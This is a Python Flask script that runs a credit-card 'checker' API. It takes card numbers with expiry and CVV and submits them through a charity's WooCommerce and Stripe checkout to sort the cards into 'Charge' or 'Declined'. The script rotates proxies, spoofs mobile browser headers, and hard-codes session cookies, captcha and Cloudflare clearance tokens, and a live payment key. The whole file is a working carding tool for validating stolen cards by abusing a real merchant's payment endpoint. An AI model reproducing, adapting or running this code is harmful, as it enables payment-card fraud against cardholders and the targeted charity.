from flask import Flask, request, jsonify
import requests
import time
import threading
from datetime import datetime

app = Flask(__name__)

proxies_list = []
current_proxy_index = 0
last_request_time = 0
request_interval = 10
request_lock = threading.Lock()

def load_proxies():
    global proxies_list
    try:
        with open('proxies.txt', 'r') as f:
            proxies_list = [line.strip() for line in f if line.strip()]
    except:
        proxies_list = []

def get_next_proxy():
    global current_proxy_index
    if not proxies_list:
        return None
    proxy = proxies_list[current_proxy_index]
    current_proxy_index = (current_proxy_index + 1) % len(proxies_list)
    return {'http': proxy, 'https': proxy}

def check_card(card_data):
    global last_request_time
    
    with request_lock:
        current_time = time.time()
        time_since_last = current_time - last_request_time
        if time_since_last < request_interval:
            time.sleep(request_interval - time_since_last)
        
        last_request_time = time.time()
    
    try:
        card_parts = card_data.split('|')
        if len(card_parts) != 4:
            return {"error": "Invalid card format", "by": "@R_O_P_D"}
        
        card_number, exp_m, exp_y, cvv = card_parts
        
        if len(exp_y) == 2:
            exp_y = '20' + exp_y
        
        current_year = datetime.now().year
        current_month = datetime.now().month
        
        if int(exp_y) < current_year or (int(exp_y) == current_year and int(exp_m) < current_month):
            return {"status": "Expired Card", "by": "@R_O_P_D"}
        
        headers1 = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'ar-AE,ar;q=0.9,en-IN;q=0.8,en;q=0.7,en-US;q=0.6',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }

        data1 = f'billing_details[name]=Zbi+Oeiror&billing_details[email]=111vxh0jcg%40osxofulk.com&billing_details[phone]=01289160633&billing_details[address][city]=Oeheorhrp&billing_details[address][country]=IE&billing_details[address][line1]=Pehdpd&billing_details[address][line2]=O3heuorrh&billing_details[address][postal_code]=A91+V06A&billing_details[address][state]=LH&type=card&card[number]={card_number}&card[cvc]={cvv}&card[exp_year]={exp_y}&card[exp_month]={exp_m}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F846ec90400%3B+stripe-js-v3%2F846ec90400%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fbreastcancerresearch.ie&time_on_page=346512&client_attribution_metadata[client_session_id]=8b6f4c0f-63d0-4960-ab52-c3d7cc733418&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=4820cb57-68f3-426a-9b05-aec004d78c83&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&client_attribution_metadata[merchant_integration_additional_elements][1]=payment&guid=72aab036-b548-48d8-af10-4ff370ed9f9bb09e72&muid=48424225-45fc-473a-b00a-a179ffe75cecdeab4f&sid=02897b14-9843-4e07-9f03-ac8f1e7fe3341a6614&key=pk_live_51J4kFAFS97fwg3KK41P8OfGLA3H3nGJSEA8IGfa9EzcXRq3C7yLeZK77YWoy1vGTYnL6au52TrkH4sxkX6x3HIw800x4RXaHkv&_stripe_version=2024-06-20&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzYzMDM4NDI3LCJjZGF0YSI6IkhGL0xENDVlVW1xQVZDVWZaRW9BWUxMMjVjVmJtbmlZQy92aXRGUWpxbS9BeEZNL3EvbG5qQnRXcXNjUWZVZllnMWRLSGEyWGdMdjBzT1Vac3NuQWJpN0VmdHF3c20xTUwwMmdadGFBVjgxZHFUcnhmUUtrYlNSUExtZWtQSzltWXBFWWR1T2dUS0FQblQ2QUphRGtNakE3TDFzWElydHJ3N09sT2pDMFFseFdFZGtQM0dLUVhPcDFMZEREZ0gwNnlMWWNhMkJITDBxSUFNNFkiLCJwYXNza2V5IjoiaGYrblpacmZKM2VSSFZOZDBneHpRQlo0bUpvdVE1T1hWOG5kMTJwN3k5U2MrWGNNdlJMVkR3TnJQZGxPbGFNcExTRzVMSVA0VTkvdVhTaHpzOURmVUp1RGYvSnMyMmpGd1RoalN0T1dSTXlyNUFKenI0Q3c5QkR2UXdUZFNhVUE1OFBINHdrM09ja3B5L0FNSHNyYUFTR3hXMTlwZjk3ME44ZUF1MTl5RTJLemdqa0xHc2dTMk5URFl2M2lIY2c3ekRWYjZqbGdLUjBKYUJDbnpnOTd5ekFPdkZ1elFkQ3ZDamZBQmdWaXVlbzYzVkFtQUMxUzhiMlFGdmhibzJSQ2hGNjhLWTgzTE9zUUk1eTU1eFF5NURMbjNQTmtTMjJLcmU1REFaS0ZPYVdha0ZHd2N4R0lDWFBZTG40ZHRsMXNWSHFXQU9FT3JxNnU4cnVVRVdEb1RhT2tHWHprVURmMkZhcStXbnlCL1N1RDV3cGdTTlJXTkwzUUxMNUFMU05kRFMzSXpaTllqamVaK0QwNVh5MVhPZ2R4YnZBMnQ1VlFwRnRuR3BVekRQQk9lQnlrWTdtaTROVGsrUTB5V3FQSkJTcDczYmxkV2U1Z3AwRDBSRjllRC94Vit1NFhFdXlCcExadUo5MUsxTTdKUmI0S2JrSEV2Tk9TM2dKNkVDbzFhQW5jNnpyelZ2a0Nlcit6NDh2d3ptMHlyZmp3S3ZKWXlMOXhqeUFtRFd4T2xBbzN5VEwvZXhIWWdsOHhacXliK2UrVC9TUmc3SlNiSk9VdVVSOWF5K1B0M1ZCeUZoZlNvaVl3ZkZ2UUpuZlArc2w1UU54K3I4OC9jZUJndmd3S3hJVnR2NjJvUGsrNlNJZlVZUHhsRHA1c0pYRXcyZy9ZRVJKeWZ5OFRmdS80NDE5dUYvZ0g1OStVTnV4eitFMVUyUnB4U2UrMTRvVmFCVzRXQWZUb04zdEw2NlFnaC81L3QxUjUrQXV0emQvVUVsOW5RbXBjd0haYUxzb0pmZklzNEJhUTBmZEF5ellLbmR6TnBqS3dMSndtMUdEY0hLR3N6VGlrWnZFeUpXMmlKMTJ1QlpGUWVhZW0vV0VrTGlnVDZ1eXJiWFhkd1EzbS9qd2hvaVE5NmorcGxlQ3ZwUnF0clJsd3JiaDdXajQ0dk5rbE8zM2V4UE1WQVFQeW1LSU84c1FZcjNTVzlsYStGRmtTRGpqWFZHcDhNc0ErS2JLempnTDd2OSt3RENFZGdvTU9lRHUwTzZCSG9idDhTOFkxeEwxcDlaMXRBOGs2VW9ySi84OEFHc0RFNCtucUxva1luZ3lRRFVpVTZYUWllbkI5SGlhOFgvMSsxYVRXTEtOOGhHRlczOTVLY2pIVFJ5TEVmTS8xZmVDY0xtbEZaRkdKZW9kVk11UDcvY1hGcWFmNDFzMnp2QkhHYnZjOUZnTkJFMExBSlVQenNUcDh3SnE1TlErTXIwaHBHcldIeVZrM0xYeGNqQVE3UUpvZG5MS3NHcDYxN3N3Z0djV0VYVlNZS1UrSTFJc1JZSDcvdGdIeVJDNGJQQTQrUW9NVVBFblRrL3g4bkpMQ0c1MHlPa1FtRVA1cGdxQVNqaTQxYk42NU5HUWR0dDF6VHYxTE11SnpHZ3RKK0ZRZFN0eUxCYWZlTzFuejhLTDNYWGFUcmlSbXJoVTF4MFhQRURSMFlxY0x1SlJ3SUo5aDN1YmpQWjNQMDZkcXNjMi9LTTZsZStLRkFJWXh4RUtMNEJEN2hEdUhCdHMvdG16WVhVNkkzOVpZbHZWZlpqRmZpMEtlczREU3JkWlBTZU5zUDN2L2NKd0RNSERjOW1Za0ZtSlBzcW93SWpXdklCNkt4NXlFcTFxL1ZuSFR3T1paWWsrWHBJcjBzYU5QdDBNRzRvRkNRVkErY1NYQTBiZm9id0V0MnE4NnpnVS9wTVpkR1M5MG40dXRDR3U4cks4OG1hQzdyYStzdW80S1FHODA0V3ZZU3lYM0hubWRScVZJR1FPRjJNZ2VtbG5ESDc4bEFrM2VlS3YrVTdzcDBHc254NXlyS2pxTnZ3NVdWREJiNkN4MktSUnZLb0JnWmJKclZnM0RueWJ5UjU3dHFoM01NdXZYV0ppV3JXUEludndZaVlLeGNMVUdlZS90cjlRdGIxVUY5OGhhQnZnTWFvaVdOOTNjSXNtRTZJemdIY1UzYit5WXg4QzQ3dmhmdnYxeDdlN3FPZEN4eEdoa090d0RoakRMNkYyYTdwWC96bnRQTHNmcXBQVzVQVk5WMXhKTDdEY2habGxhalRDZzhPbUp6cFB5NVVpam5iR3BpaVZGaVhhWFVFTWZZTWFkZVJDT2JyL3owRVBXdTFDalFRcjN4TE90UnFPdS9oek54RHp0eUdHYkJwYWduMiswV0tPNEx4NWtSZzh4ZWlRY2FSZjJpb2ZVZXAwUXY5UzgrejhxbWpMczkrTlB2M0llUHcyQUZhTFpHK2lkQ1M2YXhFUTRKUnVRVXJUYStmdy8xdFRyTnpyU081TEtEdi9QQmQ5NlZsRUxiZmhiS21RRyIsImtyIjoiMzg5ZDQ1ZjYiLCJzaGFyZF9pZCI6NTM1NzY1NTl9.c8BbM5uhnj4j9KcaD1E0usj09g2i_LAedkREhERNEpM'

        proxy = get_next_proxy()
        
        if proxy:
            response1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers1, data=data1, proxies=proxy)
        else:
            response1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers1, data=data1)
        
        stripe_response = response1.json()
        
        cookies = {
            '_ga': 'GA1.1.1225932210.1761747473',
            'cmplz_consented_services': '',
            'cmplz_policy_id': '16',
            'cmplz_marketing': 'allow',
            'cmplz_statistics': 'allow',
            'cmplz_preferences': 'allow',
            'cmplz_functional': 'allow',
            'cmplz_banner-status': 'dismissed',
            '__stripe_mid': '48424225-45fc-473a-b00a-a179ffe75cecdeab4f',
            'pys_advanced_form_data': '%7B%22first_name%22%3A%22Zbi%22%2C%22last_name%22%3A%22Oeiror%22%2C%22email%22%3A%22111vxh0jcg%40osxofulk.com%22%2C%22phone%22%3A%2201289160633%22%7D',
            '_clck': '1e1zip7%5E2%5Eg0n%5E0%5E2128',
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_current_add': 'fd%3D2025-11-13%2012%3A35%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Fbreastcancerresearch.ie%2F%23%7C%7C%7Crf%3D%28none%29',
            'sbjs_first_add': 'fd%3D2025-11-13%2012%3A35%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Fbreastcancerresearch.ie%2F%23%7C%7C%7Crf%3D%28none%29',
            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'pys_session_limit': 'true',
            'pys_start_session': 'true',
            'pys_first_visit': 'true',
            'pysTrafficSource': 'direct',
            'pys_landing_page': 'https://breastcancerresearch.ie/#',
            'last_pysTrafficSource': 'direct',
            'last_pys_landing_page': 'https://breastcancerresearch.ie/#',
            '__stripe_sid': '02897b14-9843-4e07-9f03-ac8f1e7fe3341a6614',
            'PHPSESSID': '4862546915d0b386ec8899583798',
            'woocommerce_items_in_cart': '1',
            'woocommerce_cart_hash': '688808bd5be86c5596e8bdabb7b8556c',
            'woocommerce_recently_viewed': '6431',
            'wp_woocommerce_session_dafe1b836f3abb00a77ba15c7c61bfb3': 't_b21113fb51b2d8748946e9beaff287%7C1763210164%7C1763123764%7C%24generic%24wjEN8onenEzR4Mvawe-mCy7zhu0lIwzDbAw4Rl-O',
            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36',
            'cf_clearance': 'lKcpNfXW342ckbpwe8lNxbGdlNqI.2LfVSigw_YE.cc-1763037881-1.2.1.1-XBnQ78CENwzIDBvAVQKjtJit7u_elLEotMzKh4yUtxnA6ixNPVW8NEPLESjpl11oE4N_63IYcXWdi2F.RKirGzS4UeVp7ABnmfEoUmABDJaoqGZqrF2rDOtTiXahkwWvSs3h5eJdb4X666QCGBlQ5MinPQ1yJmHMAoPBACEJh9y4fwBRKewN59oKnSrnVagRYEuv7UlMMUjphFe3NrDMt6R7BdRDMoRngDMDs61ps94',
            'sbjs_session': 'pgs%3D13%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fbreastcancerresearch.ie%2Fcheckout%2F',
            '_ga_D31GYRGGNN': 'GS2.1.s1763037324$o6$g1$t1763038058$j60$l0$h0',
        }

        headers2 = {
            'authority': 'breastcancerresearch.ie',
            'accept': '*/*',
            'accept-language': 'ar-AE,ar;q=0.9,en-IN;q=0.8,en;q=0.7,en-US;q=0.6',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://breastcancerresearch.ie',
            'referer': 'https://breastcancerresearch.ie/checkout/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        params = {'wc-ajax': 'update_order_review'}

        data2 = 'security=1b411214b5&payment_method=stripe&country=IE&state=LH&postcode=A91+V06A&city=Oeheorhrp&address=Pehdpd&address_2=O3heuorrh&s_country=IE&s_state=LH&s_postcode=A91+V06A&s_city=Oeheorhrp&s_address=Pehdpd&s_address_2=O3heuorrh&has_full_address=true&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D(none)%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fbreastcancerresearch.ie%252F%2523%26wc_order_attribution_session_start_time%3D2025-11-13%252012%253A35%253A25%26wc_order_attribution_session_pages%3D13%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3DMozilla%252F5.0%2520(Linux%253B%2520Android%252010%253B%2520K)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F137.0.0.0%2520Mobile%2520Safari%252F537.36%26billing_email%3D111vxh0jcg%2540osxofulk.com%26billing_first_name%3DZbi%26billing_last_name%3DOeiror%26billing_company%3D%26billing_country%3DIE%26billing_address_1%3DPehdpd%26billing_address_2%3DO3heuorrh%26billing_city%3DOeheorhrp%26billing_state%3DLH%26billing_postcode%3DA91%2520V06A%26billing_phone%3D01289160633%26shipping_first_name%3DZbi%26shipping_last_name%3DOeiror%26shipping_company%3D%26shipping_country%3DIE%26shipping_address_1%3DPehdpd%26shipping_address_2%3DO3heuorrh%26shipping_city%3DOeheorhrp%26shipping_state%3DKY%26shipping_postcode%3DSY16%26order_comments%3D%26shipping_method%255B0%255D%3Dflat_rate%253A1%26payment_method%3Dstripe%26wc-stripe-payment-method-upe%3D%26wc_stripe_selected_upe_payment_type%3D%26wc-stripe-is-deferred-intent%3D1%26woocommerce-process-checkout-nonce%3Dcc197e68b7%26_wp_http_referer%3D%252F%253Fwc-ajax%253Dupdate_order_review%26pys_utm%3Dutm_source%253Aundefined%257Cutm_medium%253Aundefined%257Cutm_campaign%253Aundefined%257Cutm_term%253Aundefined%257Cutm_content%253Aundefined%26pys_utm_id%3Dfbadid%253Aundefined%257Cgadid%253Aundefined%257Cpadid%253Aundefined%257Cbingid%253Aundefined%26pys_browser_time%3D14-15%257CThursday%257CNovember%26pys_landing%3Dhttps%253A%252F%252Fbreastcancerresearch.ie%252F%2523%26pys_source%3Ddirect%26pys_order_type%3Dnormal%26last_pys_landing%3Dhttps%253A%252F%252Fbreastcancerresearch.ie%252F%2523%26last_pys_source%3Ddirect%26last_pys_utm%3Dutm_source%253Aundefined%257Cutm_medium%253Aundefined%257Cutm_campaign%253Aundefined%257Cutm_term%253Aundefined%257Cutm_content%253Aundefined%26last_pys_utm_id%3Dfbadid%253Aundefined%257Cgadid%253Aundefined%257Cpadid%253Aundefined%257Cbingid%253Aundefined%26wc-stripe-payment-method%3Dpm_1SSzymFS97fwg3KKOLDdva4d&shipping_method%5B0%5D=flat_rate%3A1'

        if proxy:
            response2 = requests.post('https://breastcancerresearch.ie/', params=params, cookies=cookies, headers=headers2, data=data2, proxies=proxy)
        else:
            response2 = requests.post('https://breastcancerresearch.ie/', params=params, cookies=cookies, headers=headers2, data=data2)
        
        wc_response = response2.json()
        
        result_text = str(wc_response.get('result', ''))
        
        if any(word.lower() in result_text.lower() for word in ['Success', 'Successfully', 'success']):
            status = "Charge ✅"
        else:
            status = "Declined 🚫"
        
        return {
            "status": status,
            "card": card_number,
            "expiry": f"{exp_m}/{exp_y}",
            "stripe_response": stripe_response,
            "wc_response": wc_response,
            "by": "@R_O_P_D"
        }
        
    except Exception as e:
        return {"error": str(e), "by": "@R_O_P_D"}

@app.route('/check', methods=['GET'])
def check_card_route():
    secret_key = request.headers.get('X-Secret-Key')
    card_data = request.args.get('card')
    
    if not card_data:
        return jsonify({"error": "No card data provided", "by": "@R_O_P_D"})
    
    if secret_key == "XAZ0OWJEOEI3737079DFkdh":
        result = check_card(card_data)
        return jsonify(result)
    else:
        return jsonify({"error": "Invalid secret key", "by": "@R_O_P_D"})

if __name__ == '__main__':
    load_proxies()
    app.run(host='0.0.0.0', port=5000)
